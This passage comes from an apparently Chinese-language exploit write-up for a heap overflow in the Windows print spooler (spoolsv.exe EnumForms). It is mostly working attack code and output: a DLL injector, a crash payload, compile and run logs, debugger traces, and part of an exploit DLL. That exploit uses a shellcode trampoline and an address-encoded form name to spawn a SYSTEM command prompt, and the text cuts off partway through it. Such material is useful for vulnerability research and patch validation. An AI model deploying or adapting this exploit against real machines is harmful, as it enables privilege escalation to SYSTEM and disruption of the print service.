    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!loadLibAddr) {
        printf("[-] Cannot find LoadLibraryW\n");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    /* Create remote thread */
    printf("[*] Injecting DLL into spoolsv.exe...\n");
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)loadLibAddr,
                                 remoteMem, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %u\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] Remote thread created. Waiting for DLL to execute...\n");

    /* Wait for thread to complete (DLL loaded and DllMain ran) */
    WaitForSingleObject(hThread, 30000); /* 30 second timeout */
    GetExitCodeThread(hThread, &exitCode);

    printf("[+] Thread completed. Exit code: 0x%08X\n", exitCode);

    if (exitCode == 0) {
        printf("[-] LoadLibrary returned NULL -- DLL load failed\n");
        printf("    Check if the DLL exists and is 64-bit\n");
    } else {
        printf("[+] DLL loaded at 0x%08X in spoolsv\n", exitCode);
    }

    /* Check if spoolsv is still alive */
    DWORD spoolPid = FindProcessByName(L"spoolsv.exe");
    if (spoolPid == pid) {
        printf("[+] spoolsv.exe still running (PID %u)\n", spoolPid);
    } else if (spoolPid) {
        printf("[!] spoolsv.exe restarted (new PID %u, was %u)\n", spoolPid, pid);
        printf("    *** CRASH DETECTED -- vulnerability confirmed! ***\n");
    } else {
        printf("[!] spoolsv.exe is DEAD!\n");
        printf("    *** CRASH DETECTED -- vulnerability confirmed! ***\n");
    }

    /* Cleanup */
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("\n[*] Check C:\\Windows\\Temp\\enumforms_inject_log.txt for results\n");

    return 0;
}
```

在主流或 Canary 版 Windows 上构建并运行，步骤如下：

```rust
C:\Users\Administrator\ers11> call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

**********************************************************************
** Visual Studio 2022 Developer Command Prompt v17.14.23
** Copyright (c) 2025 Microsoft Corporation
**********************************************************************
[vcvarsall.bat] Environment initialized for: 'x64'

C:\Users\Administrator\ers11> cl /W4 /O2 /LD payload_enumforms2.c /Fe:payload_probe.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.44.35222 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

payload_enumforms2.c
payload_enumforms2.c(77): warning C4996: 'fopen': This function or variable may be unsafe. Consider using fopen_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
Microsoft (R) Incremental Linker Version 14.44.35222.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/dll
/implib:payload_probe.lib
/out:payload_probe.dll
payload_enumforms2.obj

C:\Users\Administrator\ers11> cl /W4 /O2 inject_enumforms.c advapi32.lib /Fe:inject_enumforms.exe
Microsoft (R) C/C++ Optimizing Compiler Version 19.44.35222 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

inject_enumforms.c
inject_enumforms.c(32): warning C4133: 'function': incompatible types - from 'char [17]' to 'LPCWSTR'
Microsoft (R) Incremental Linker Version 14.44.35222.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:inject_enumforms.exe
inject_enumforms.obj
advapi32.lib

C:\Users\Administrator\ers11> inject_enumforms.exe payload_probe.dll

============================================================
  spoolsv.exe DLL Injector for YEnumForms Test
============================================================

[*] DLL: C:\Users\Administrator\ers11\payload_probe.dll
[+] SeDebugPrivilege enabled
[+] spoolsv.exe PID: 4384
[+] Process opened
[+] DLL path written to spoolsv @ 0x0000000001F50000
[*] Injecting DLL into spoolsv.exe...
[+] Remote thread created. Waiting for DLL to execute...
[+] Thread completed. Exit code: 0xE3ED0000
[+] DLL loaded at 0xE3ED0000 in spoolsv
[+] spoolsv.exe still running (PID 4384)

[*] Check C:\Windows\Temp\enumforms_inject_log.txt for results

C:\Users\Administrator\ers11> type C:\Windows\Temp\enumforms_inject_log.txt

=== VALID LEVELS ===
  [ok] EnumForms(L1, cb=0x0): ERROR 122 (need=10112)
  [ok] EnumForms(L2, cb=0x0): ERROR 122 (need=102158)
  [ok] EnumForms(L1, cb=0x4000): SUCCESS (ret=144, need=10112)

=== INVALID LEVELS (no client-side validation here!) ===
  [BAD] EnumForms(L99, cb=0x1000): ERROR 0 (need=0)
  [BAD] EnumForms(L0, cb=0x1000): ERROR 0 (need=0)
  [BAD] EnumForms(L3, cb=0x1000): ERROR 0 (need=0)
  [BAD] EnumForms(L4294967295, cb=0x1000): ERROR 0 (need=0)
  [BAD] EnumForms(L2147483648, cb=0x1000): ERROR 0 (need=0)

=== LARGE BUFFERS (overflow test) ===
  [1MB] EnumForms(L1, cb=0x100000):  SUCCESS (ret=144, need=10112)
  [16MB] EnumForms(L1, cb=0x1000000): SUCCESS (ret=144, need=10112)
  [64MB] EnumForms(L1, cb=0x4000000): SUCCESS (ret=144, need=10112)

=== ARITHMETIC OVERFLOW TRIGGERS ===
  [2G-64] EnumForms(L1, cb=0x7FFFFFC0): ERROR 1784 (need=0)
```

把两个工具的输出并排放一起看：

| Level | 经 winspool.drv（客户端） | 在 spoolsv 内直连（服务端） |
| --- | --- | --- |
| 1   | ERROR 122 (INSUFF_BUFFER) | ERROR 122 (INSUFF_BUFFER) |
| 2   | ERROR 122 (INSUFF_BUFFER) | ERROR 122 (INSUFF_BUFFER) |
| 0   | ERROR 124 (INVALID_LEVEL) | ERROR 0（接受！） |
| 3   | ERROR 124 (INVALID_LEVEL) | ERROR 0（接受！） |
| 99  | ERROR 124 (INVALID_LEVEL) | ERROR 0（接受！） |
| 0x80000000 | ERROR 124 (INVALID_LEVEL) | ERROR 0（接受！） |
| 0xFFFFFFFF | ERROR 124 (INVALID_LEVEL) | ERROR 0（接受！） |

| Level / cbBuf | 经 winspool.drv（客户端） | 直连服务端（SYSTEM） |
| --- | --- | --- |
| 1 ｜ 2 | ERROR 122（要尺寸） | ERROR 122（要尺寸） |
| 99 ｜ 0 ｜ 3 | ERROR 124 (INVALID_LEVEL) | ERROR 0（接受！） |
| 0xFFFFFFFF | ERROR 124 (INVALID_LEVEL) | ERROR 0（接受！） |
| cbBuf ≈ 1 GB | 缓冲区按声明配足 | SUCCESS（全走完） |

根据上表，我们验证了 OOB 写的思路成立：服务端接受各种离谱的尺寸，因为最大值没有检查。下一步是把 OOB 写变成真正的堆溢出。第一次尝试是经 spoolss!EnumFormsW 函数让 spoolsv.exe 崩溃，所以这次不能用 SEH 保护代码，源码如下：

```cpp
/*
 * payload_realcrash.c - crash spoolsv.exe via spoolss!EnumFormsW. NO SEH: the AV
 *   propagates and kills spoolsv.
 *   Compile: cl /W4 /O2 /LD /D_CRT_SECURE_NO_WARNINGS payload_realcrash.c
 *            /Fe:payload_enumforms.dll
 */

#include <windows.h>
#include <stdio.h>

#define LOG_FILE "C:\\Windows\\Temp\\enumforms_inject_log.txt"

static FILE *g_log = NULL;

static void LOG(const char *fmt, ...) {
    va_list ap; if (!g_log) return;
    va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap); fflush(g_log);
}

typedef BOOL (WINAPI *PFN_OpenPrinterW)(LPWSTR, LPHANDLE, LPVOID);
typedef BOOL (WINAPI *PFN_EnumFormsW)(HANDLE, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *PFN_ClosePrinter)(HANDLE);

static DWORD WINAPI WorkerThread(LPVOID param) {
    (void)param;
    HMODULE hSpoolss; PFN_OpenPrinterW pOpen; PFN_EnumFormsW pEnum; PFN_ClosePrinter pClose;
    HANDLE hPrinter = NULL; DWORD needed = 0, returned = 0; BYTE *buffer;
    DWORD allocSize = 0x10000;      /* 64KB real allocation */
    DWORD fakeCbBuf = 0x7FFFFF00;   /* claim ~2GB           */

    Sleep(1000);
    g_log = fopen(LOG_FILE, "w"); if (!g_log) return 1;

    hSpoolss = GetModuleHandleW(L"spoolss.dll");
    if (!hSpoolss) hSpoolss = LoadLibraryW(L"spoolss.dll");

    pOpen  = (PFN_OpenPrinterW)GetProcAddress(hSpoolss, "OpenPrinterW");
    pEnum  = (PFN_EnumFormsW)GetProcAddress(hSpoolss, "EnumFormsW");
    pClose = (PFN_ClosePrinter)GetProcAddress(hSpoolss, "ClosePrinter");

    if (!pOpen || !pEnum || !pClose) { LOG("[-] Missing exports\n"); fclose(g_log); return 1; }

    __try {
        if (!pOpen(NULL, &hPrinter, NULL)) { LOG("[-] OpenPrinter: %u\n", GetLastError());
            fclose(g_log); return 1; }
    } __except(EXCEPTION_EXECUTE_HANDLER) { LOG("[-] OpenPrinter exception\n"); fclose(g_log);
        return 1; }

    /* Allocate buffer: 64KB real + guard page */
    buffer = (BYTE *)VirtualAlloc(NULL, allocSize + 0x1000, MEM_RESERVE, PAGE_NOACCESS);
    if (!buffer) { LOG("[-] VirtualAlloc reserve failed\n"); fclose(g_log); return 1; }

    VirtualAlloc(buffer, allocSize, MEM_COMMIT, PAGE_READWRITE);   /* commit only 64KB */

    /* the page at buffer+64KB stays PAGE_NOACCESS -- any write there = AV */

    LOG("[*] *** TRIGGERING CRASH NOW ***\n");
    fflush(g_log); fclose(g_log); g_log = NULL;

    needed = 0; returned = 0;
    /* THE CRASH CALL -- NO __try/__except. If it AVs, spoolsv dies. */
    BOOL result = pEnum(hPrinter, 1, buffer, fakeCbBuf, &needed, &returned);

    /* If we reach here the server survived; try the integer-overflow value too */
    g_log = fopen(LOG_FILE, "a");
    if (g_log) { LOG("\n[!] survived cbBuf=0x7FFFFF00: result=%d err=%u\n", result, GetLastError());
                 fclose(g_log); g_log = NULL; }

    needed = 0; returned = 0;
    result = pEnum(hPrinter, 1, buffer, 0xFFFFD880, &needed, &returned);

    pClose(hPrinter);
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) { DisableThreadLibraryCalls(hModule); CreateThread(NULL, 0,
        WorkerThread, NULL, 0, NULL); }
    return TRUE;
}
```

这个程序的总体思路：保留 0x10000+0x1000 字节为 PAGE_NOACCESS，只提交前 0x10000 为 PAGE_READWRITE，末页充当 guard page——任何对它的写都会触发异常。接下来的任务是以 `cbBuf=0x7FFFFF00` （约 2GB）直接从重定向器调用 EnumFormsW 函数，真实缓冲只有 64 KB，且不包 try/except。PackStrings 例程从 buffer + cbBuf 往回写 144 个表单名，第一个名字就落在预定 64 KB 缓冲之后约 2 GB 的未映射内存区。不出所料，写操作触发异常，spoolsv.exe 进程终止。

构建并复现，先在主流版、再在 Canary 版上执行：

```sql
C:\Users\Administrator\ers11> call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

C:\Users\Administrator\ers11> ver
Microsoft Windows [Version 10.0.26300.9550]

C:\Users\Administrator\ers11> cl /W4 /O2 /LD /D_CRT_SECURE_NO_WARNINGS payload_realcrash.c /Fe:payload_enumforms.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.44.35222 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

payload_realcrash.c
Microsoft (R) Incremental Linker Version 14.44.35222.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/dll
/implib:payload_enumforms.lib
/out:payload_enumforms.dll
payload_realcrash.obj

C:\Users\Administrator\ers11> inject_enumforms.exe payload_enumforms.dll

============================================================
  spoolsv.exe DLL Injector for YEnumForms Test
============================================================

[*] DLL: C:\Users\Administrator\ers11\payload_enumforms.dll
[+] SeDebugPrivilege enabled
[+] spoolsv.exe PID: 2408
[+] Process opened
[+] DLL path written to spoolsv @ 0x0000000001240000
[*] Injecting DLL into spoolsv.exe...
[+] Remote thread created. Waiting for DLL to execute...
[+] Thread completed. Exit code: 0xDDC20000
[+] DLL loaded at 0xDDC20000 in spoolsv
[+] spoolsv.exe still running (PID 2408)

[*] Check C:\Windows\Temp\enumforms_inject_log.txt for results

C:\Users\Administrator\ers11> type C:\Windows\Temp\enumforms_inject_log.txt
[*] *** TRIGGERING CRASH NOW ***


PS C:\Users\Administrator\ers11> Get-Process | grep spoolsv
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------   -----      -----      ------     --  -- -----------
    460      52     5772      21900       0.19   2408   0 spoolsv
      0      50     1236         24       0.00   8948   0 spoolsv

C:\Users\Administrator\ers11> call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

C:\Users\Administrator\ers11> ver
Microsoft Windows [Version 10.0.29683.1000]

C:\Users\Administrator\ers11> cl /W4 /O2 /LD /D_CRT_SECURE_NO_WARNINGS payload_realcrash.c
Microsoft (R) C/C++ Optimizing Compiler Version 19.34.31937 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

payload_realcrash.c
Microsoft (R) Incremental Linker Version 14.34.31937.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:payload_realcrash.dll
/dll
/implib:payload_realcrash.lib
payload_realcrash.obj

C:\Users\Administrator\ers11> inject_enumforms.exe payload_enumforms.dll

============================================================
  spoolsv.exe DLL Injector for YEnumForms Test
============================================================

[*] DLL: C:\Users\Administrator\ers11\payload_enumforms.dll
[+] SeDebugPrivilege enabled
[+] spoolsv.exe PID: 15444
[+] Process opened
[+] DLL path written to spoolsv @ 0x0000000000B70000
[*] Injecting DLL into spoolsv.exe...
[+] Remote thread created. Waiting for DLL to execute...
[+] Thread completed. Exit code: 0x66850000
[+] DLL loaded at 0x66850000 in spoolsv
[+] spoolsv.exe still running (PID 15444)

[*] Check C:\Windows\Temp\enumforms_inject_log.txt for results

C:\Users\Administrator\ers11> type C:\Windows\Temp\enumforms_inject_log.txt
[*] *** TRIGGERING CRASH NOW ***


PS C:\Users\Administrator\ers11> Get-Process | grep spoolsv
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------   -----      -----      ------     --  -- -----------
    172      14     1868      9628       0.02  14004   0 spoolsv
```

可以看到，崩溃发生后 spoolsv.exe 进程的表现随 build 而异：主流版上，异常后进程还活着（spooler 把拷贝包在 WIL 异常处理器里，栈上表现为 localspl!wil::ResultFromException）；而 Canary 版上 spoolsv.exe 进程会重启，应用程序事件日志记下“Faulting application name: spoolsv.exe, version: 10.0.29683.1000”。

要在 Canary 上凑近了看，可以给进程（现在是 14004）挂一个在访问违例时断下的调试器，再开第二个终端重复实验、注入 DoS DLL：

```javascript
C:\Users\Administrator> ver
Microsoft Windows [Version 10.0.29683.1000]

C:\Users\Administrator> cdb -pn spoolsv.exe -c "sxe -c \"k 30; q\" av; g"

Microsoft (R) Windows Debugger Version 10.0.22621.1 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

*** wait with pending attach
************* Path validation summary **************
Response                         Time (ms)     Location
Deferred                                        srv*c:\symbols*https://msdl.microsoft.com/download/symbols
...
Executable search path is:
ModLoad: 00007ff6`3a9a0000 00007ff6`3aa88000   C:\WINDOWS\System32\spoolsv.exe
ModLoad: 00007ff8`74810000 00007ff8`74a78000   C:\WINDOWS\SYSTEM32\ntdll.dll
ModLoad: 00007ff8`73c30000 00007ff8`73cef000   C:\WINDOWS\SYSTEM32\KERNEL32.DLL
....
....
ModLoad: 00007ff8`717d0000 00007ff8`71834000   C:\WINDOWS\SYSTEM32\WINSTA.dll
ModLoad: 00007ff8`707f0000 00007ff8`70827000   C:\WINDOWS\system32\rsaenh.dll
ModLoad: 00007ff8`71070000 00007ff8`7107c000   C:\WINDOWS\SYSTEM32\CRYPTBASE.dll

(36b4.31e8): Break instruction exception - code 80000003 (first chance)
ntdll!DbgBreakPoint:
00007ff8`74936690 cc              int     3

0:007> cdb: Reading initial command 'sxe -c "k 30; q" av; g'

ModLoad: 00007ff8`65070000 00007ff8`65099000   C:\Users\Administrator\ers11\payload_enumforms.dll

(258c.3da8): Access violation - code c0000005 (first chance)

Child-SP          RetAddr               Call Site
00000000`01c4f888 00007ff6`3a9ab39e     ucrtbase!memcpy+0x93     <- access violation
00000000`01c4f890 00007ff8`66851f30     spoolsv!PackStrings+0x9e     <- copying from strings
00000000`01c4f8f0 00007ff8`4d4b7c61     SPOOLSS!PackStrings+0x20
00000000`01c4f930 00007ff8`4d5383f9     localspl!CopyIniFormToFormInfo+0x2b1
00000000`01c4fbc0 00007ff8`4d4c0760     localspl!InternalEnumForms+0xf9
00000000`01c4fc40 00007ff8`4d4c0695     localspl!<lambda_48e7f394dc3b3fcb2d72fcafaa33824f>::operator()+0xb8
00000000`01c4fc80 00007ff8`4d538ba3     localspl!wil::ResultFromException<<lambda_48e7f394dc3b3fcb2d72fcafaa33824f> >+0x9
00000000`01c4fcb0 00007ff6`3a9adb86     localspl!SplEnumForms+0x63
00000000`01c4fd30 00007ff8`6685cc16     spoolsv!EnumFormsW+0x56
*** WARNING: Unable to verify checksum for C:\Users\Administrator\ers11\payload_enumforms.dll
00000000`01c4fd80 00007ff8`65071254     SPOOLSS!EnumFormsW+0x66
00000000`01c4fdd0 00007ff8`73c5ee53     payload_enumforms+0x1254
00000000`01c4fe30 00007ff8`7488a900     KERNEL32!BaseThreadInitThunk+0x13
00000000`01c4fe60 00000000`00000000     ntdll!RtlUserThreadStart+0x20

quit:
NatVis script unloaded from 'C:\Program Files (x86)\Windows ...
NatVis script unloaded from 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Visualizers\Windows.Data.Json.natvis'
...
...

C:\Users\Administrator>
```

guard page 崩溃清楚地证明写操作逃出了缓冲区，但关于写本身我们错过了宝贵信息——它落在 guard page 上而不是 groom 过的堆，否则我们既能跟踪被写的内容，也能拿到它的偏移。所以，真正的利用是下一项任务。

## 09\. 漏洞利用

exploit 有两个版本。第一个（变体 A）需要查看日志文件来确认利用成功；第二个变体略有不同——它直接弹出一个命令提示符，可以在里面验证我们已经从 Administrator 提升到了 System。两个完整的 exploit 源码都在下面：

```swift
/*
 * exploit_stage4_exec_clean.c -- EnumForms heap-overflow EoP, variant A (token proof).
 *
 * Injected into spoolsv.exe (Session 0, no console), so progress is written to a log
 * file via LOG() rather than printf -- each Step is announced with a banner and
 * reports what it did, the same staged style the injector prints to the console.
 *
 * Build: cl /W4 /O2 /LD exploit_stage4_exec_clean.c /Fe:payload_token.dll
 * Run:   inject_enumforms.exe payload_token.dll    (admin + SeDebug)
 * Output: C:\Windows\Temp\enumforms_inject_log.txt (staged log)
 *         C:\Windows\Temp\EXPLOITED.txt            (SYSTEM token proof)
 */

#include <windows.h>
#include <sddl.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

#define LOG_FILE "C:\\Windows\\Temp\\enumforms_inject_log.txt"
#define PROOF_FILE "C:\\Windows\\Temp\\EXPLOITED.txt"

static FILE *g_log = NULL;

static void LOG(const char *fmt, ...) {
    va_list ap;
    if (!g_log) return;
    va_start(ap, fmt);
    vfprintf(g_log, fmt, ap);
    va_end(ap);
    fflush(g_log);
}

static void STEP(const char *title) {
    LOG("\n============================================================\n");
    LOG("  %s\n", title);
    LOG("============================================================\n");
}

typedef BOOL (WINAPI *PFN_OpenPrinterW)(LPWSTR, LPHANDLE, LPVOID);
typedef BOOL (WINAPI *PFN_EnumFormsW)(HANDLE, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *PFN_ClosePrinter)(HANDLE);
typedef BOOL (WINAPI *PFN_AddFormW)(HANDLE, DWORD, LPBYTE);
typedef BOOL (WINAPI *PFN_DeleteFormW)(HANDLE, LPWSTR);

typedef void (*PFN_CALLBACK)(void);

typedef struct _SPRAY_OBJ {
    PFN_CALLBACK callback;
    DWORD marker;
    DWORD index;
    BYTE padding[1];
} SPRAY_OBJ;

#define SPRAY_COUNT     300
#define HOLE_INTERVAL   4

static SPRAY_OBJ *g_spray[SPRAY_COUNT];
static HANDLE g_heap;
static PVOID g_shellcode = NULL;
static wchar_t g_form_name[128];

static void __cdecl shellcode_func(void) {
    HANDLE hToken = NULL, hFile; DWORD written; char buf[4096]; int pos = 0;

    pos += sprintf_s(buf + pos, sizeof(buf) - pos,
        "============================================================\r\n"
        "  EXPLOIT PROOF: Code Execution as SYSTEM\r\n"
        "  spoolsv.exe EnumForms Heap Overflow (CWE-122 / CWE-787)\r\n"
        "============================================================\r\n\r\n");

    pos += sprintf_s(buf + pos, sizeof(buf) - pos,
        "Process: spoolsv.exe (PID %u)\r\n", GetCurrentProcessId());

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BYTE tu[256]; DWORD rl = 0;
        if (GetTokenInformation(hToken, TokenUser, tu, sizeof(tu), &rl)) {
            WCHAR name[128] = {0}, dom[128] = {0}; DWORD nl = 128, dl = 128; SID_NAME_USE use;
            if (LookupAccountSidW(NULL, ((TOKEN_USER *)tu)->User.Sid, name, &nl, dom, &dl, &use))
                pos += sprintf_s(buf + pos, sizeof(buf) - pos, "Token User: %S\\%S\r\n", dom, name);
            LPWSTR sid = NULL;
            if (ConvertSidToStringSidW(((TOKEN_USER *)tu)->User.Sid, &sid)) {
                pos += sprintf_s(buf + pos, sizeof(buf) - pos, "Token SID:  %S\r\n", sid); LocalFree(sid);
            }
        }

        BYTE tp[2048];
        if (GetTokenInformation(hToken, TokenPrivileges, tp, sizeof(tp), &rl)) {
            TOKEN_PRIVILEGES *pv = (TOKEN_PRIVILEGES *)tp;
            pos += sprintf_s(buf + pos, sizeof(buf) - pos, "Token Privileges: %u\r\n", pv->PrivilegeCount);
            for (DWORD k = 0; k < pv->PrivilegeCount && k < 30; k++) {
                WCHAR pn[128] = {0}; DWORD pl = 128;
                if (LookupPrivilegeNameW(NULL, &pv->Privileges[k].Luid, pn, &pl)) {
                    DWORD a = pv->Privileges[k].Attributes;
                    const char *st = (a & SE_PRIVILEGE_ENABLED) ? "Enabled" :
                                     (a & SE_PRIVILEGE_ENABLED_BY_DEFAULT) ? "Default" : "Disabled";
                    pos += sprintf_s(buf + pos, sizeof(buf) - pos, "  %S [%s]\r\n", pn, st);
                }
            }
        }

        BYTE ti[128];
        if (GetTokenInformation(hToken, TokenIntegrityLevel, ti, sizeof(ti), &rl)) {
            TOKEN_MANDATORY_LABEL *lbl = (TOKEN_MANDATORY_LABEL *)ti;
            DWORD *sa = GetSidSubAuthority(lbl->Label.Sid,
                          (DWORD)(UCHAR)(*GetSidSubAuthorityCount(lbl->Label.Sid) - 1));
            const char *lv = (*sa >= 0x4000) ? "SYSTEM" : (*sa >= 0x3000) ? "High" :
                             (*sa >= 0x2000) ? "Medium" : "Low";
            pos += sprintf_s(buf + pos, sizeof(buf) - pos, "Integrity Level: %s (0x%X)\r\n", lv, *sa);
        }
        CloseHandle(hToken);
    }

    pos += sprintf_s(buf + pos, sizeof(buf) - pos, "\r\n[*] Spawning SYSTEM shell...\r\n");

    STARTUPINFOW si = {0}; si.cb = sizeof si; PROCESS_INFORMATION pi = {0};
    WCHAR sysDir[MAX_PATH], cmd[MAX_PATH]; GetSystemDirectoryW(sysDir, MAX_PATH);
    swprintf_s(cmd, MAX_PATH, L"%s\\cmd.exe", sysDir);

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        pos += sprintf_s(buf + pos, sizeof(buf) - pos, "[+] SYSTEM shell PID: %lu\r\n", pi.dwProcessId);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    hFile = CreateFileA(PROOF_FILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) { WriteFile(hFile, buf, pos, &written, NULL); CloseHandle(hFile); }
}

static void encode_address_as_form_name(UINT_PTR addr, wchar_t *name, int max_len) {
    BYTE *bytes = (BYTE *)&addr; int i, wchar_count = 0;
    name[0] = 0;
    for (i = 0; i < 8; i += 2) {
        wchar_t wc = (wchar_t)(bytes[i] | (bytes[i+1] << 8));
        if (wc == 0) break;
        name[wchar_count++] = wc;
        if (wchar_count >= max_len - 1) break;
    }
    name[wchar_count] = 0;
}

static DWORD WINAPI WorkerThread(LPVOID param) {
    (void)param;
    HMODULE hSpoolss;
    PFN_OpenPrinterW pOpen; PFN_EnumFormsW pEnum; PFN_ClosePrinter pClose;
    PFN_AddFormW pAddForm; PFN_DeleteFormW pDeleteForm;
    HANDLE hPrinter = NULL; DWORD needed = 0, returned = 0; int i;
    BYTE *buffer = NULL;

    Sleep(1000);
    g_log = fopen(LOG_FILE, "w");
    if (!g_log) return 1;

    LOG("============================================================\n");
    LOG("  EXPLOIT STAGE 4: Code Execution via Heap Overflow\n");
    LOG("  PID: %u (spoolsv.exe, NT AUTHORITY\\SYSTEM)\n", GetCurrentProcessId());
    LOG("============================================================\n");

    STEP("STEP 0: BUILD TRAMPOLINE AND ENCODE TARGET ADDRESS");

    LOG("[*] Step 0: Preparing shellcode function\n");
    UINT_PTR shellcode_addr = (UINT_PTR)&shellcode_func;
    LOG("    shellcode_func at: 0x%p\n", (void *)shellcode_addr);

    BYTE *addr_bytes = (BYTE *)&shellcode_addr;
    LOG("    Address bytes: ");
    for (i = 0; i < 8; i++) LOG("%02X ", addr_bytes[i]);
    LOG("\n");

    BOOL has_null_wchar = FALSE;
    for (i = 0; i < 6; i += 2) {
        wchar_t wc = (wchar_t)(addr_bytes[i] | (addr_bytes[i+1] << 8));
        if (wc == 0) { has_null_wchar = TRUE; break; }
    }

    if (has_null_wchar) {
        LOG("    [!] Address has a null wchar in the low 6 bytes\n");
        LOG("    [*] Allocating a null-free executable page for a trampoline...\n");

        for (UINT_PTR try_addr = 0x10010000; try_addr < 0x7FFF0000; try_addr += 0x10000) {
            BYTE *tb = (BYTE *)&try_addr;
            wchar_t w0 = (wchar_t)(tb[0] | (tb[1] << 8));
            wchar_t w1 = (wchar_t)(tb[2] | (tb[3] << 8));
            if (w0 != 0 && w1 != 0) {
                g_shellcode = VirtualAlloc((PVOID)try_addr, 4096,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (g_shellcode) {
                    LOG("    [+] Shellcode at: 0x%p (null-free)\n", g_shellcode);
                    BYTE *code = (BYTE *)g_shellcode;
                    code[0] = 0x48; code[1] = 0xB8;
                    *(UINT_PTR *)(code + 2) = shellcode_addr;
                    code[10] = 0xFF; code[11] = 0xE0;
                    shellcode_addr = (UINT_PTR)g_shellcode;
                    break;
                }
            }
        }
        if (!g_shellcode) {
            LOG("    [-] Cannot allocate null-free address\n");
            LOG("    [*] Falling back to direct address\n");
        }
    } else {
        LOG("    [+] Address is null-free; encoding it directly (no trampoline)\n");
    }

    encode_address_as_form_name(shellcode_addr, g_form_name, 128);
    LOG("    Form name encoding: L\"");
    for (i = 0; g_form_name[i]; i++) LOG("\\x%04X", g_form_name[i]);
    LOG("\" + null\n");

    UINT_PTR decoded = 0;
    BYTE *dec_bytes = (BYTE *)&decoded;
    for (i = 0; g_form_name[i] && i < 4; i++) {
        dec_bytes[i*2]   = (BYTE)(g_form_name[i] & 0xFF);
        dec_bytes[i*2+1] = (BYTE)(g_form_name[i] >> 8);
    }
    LOG("    Decoded address: 0x%p %s\n", (void *)decoded,
        decoded == shellcode_addr ? "(MATCH!)" : "(MISMATCH!)");
    LOG("[+] Step 0 complete: callback value ready\n");

    STEP("STEP 1: RESOLVE ROUTER EXPORTS AND OPEN PRINTER");

    hSpoolss = GetModuleHandleW(L"spoolss.dll");
    if (!hSpoolss) hSpoolss = LoadLibraryW(L"spoolss.dll");
    LOG("[*] spoolss.dll at 0x%p\n", (void *)hSpoolss);

    pOpen = (PFN_OpenPrinterW)GetProcAddress(hSpoolss, "OpenPrinterW");
    pEnum = (PFN_EnumFormsW)GetProcAddress(hSpoolss, "EnumFormsW");
    pClose = (PFN_ClosePrinter)GetProcAddress(hSpoolss, "ClosePrinter");
    pAddForm = (PFN_AddFormW)GetProcAddress(hSpoolss, "AddFormW");
    pDeleteForm = (PFN_DeleteFormW)GetProcAddress(hSpoolss, "DeleteFormW");

    if (!pOpen || !pEnum || !pClose || !pAddForm || !pDeleteForm) {
        LOG("[ - ] Could not resolve one or more router exports\n");
        fclose(g_log); g_log = NULL; return 1;
    }
    LOG("    [+] OpenPrinterW/EnumFormsW/ClosePrinter/AddFormW/DeleteFormW resolved\n");

    __try {
        if (!pOpen(NULL, &hPrinter, NULL)) {
            LOG("[ - ] OpenPrinter: %u\n", GetLastError());
            fclose(g_log); return 1;
        }
    } __except(1) {
        LOG("[ - ] OpenPrinter exception\n");
        fclose(g_log); return 1;
    }
    LOG("    [+] Printer handle: 0x%p\n", (void *)hPrinter);
    LOG("[+] Step 1 complete: router ready, local print server opened\n");

    STEP("STEP 2: PLANT FORM WHOSE NAME ENCODES THE ADDRESS");

    LOG("\n[*] Step 2: Adding form with encoded address name\n");
    {
        typedef struct {
            DWORD Flags; LPWSTR pName; SIZEL Size; RECTL ImageableArea;
        } MY_FORM_INFO_1;

        MY_FORM_INFO_1 fi = {0};
        fi.Flags = 0;
        fi.pName = g_form_name;
        fi.Size.cx = 215900;
        fi.Size.cy = 279400;
        fi.ImageableArea.right = 215900;
        fi.ImageableArea.bottom = 279400;

        pDeleteForm(hPrinter, g_form_name);
        if (pAddForm(hPrinter, 1, (LPBYTE)&fi))
            LOG("    [+] Form added\n");
        else
            LOG("    [ - ] AddForm: %u\n", GetLastError());
    }
